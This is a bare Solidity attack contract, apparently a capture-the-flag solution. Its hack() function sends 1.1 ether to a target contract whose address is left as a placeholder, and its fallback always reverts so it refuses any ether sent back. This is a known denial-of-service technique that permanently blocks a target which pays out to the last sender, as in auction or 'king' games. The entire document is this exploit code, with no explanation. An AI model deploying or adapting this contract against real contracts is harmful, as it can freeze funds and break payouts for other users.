pragma solidity ^0.4.18;

contract Attack {
    address instance_address = instance_address_here;

    function Attack() payable{}

    function hack() public {
        instance_address.call.value(1.1 ether)();
    }

    function () public {
        revert();
    }
}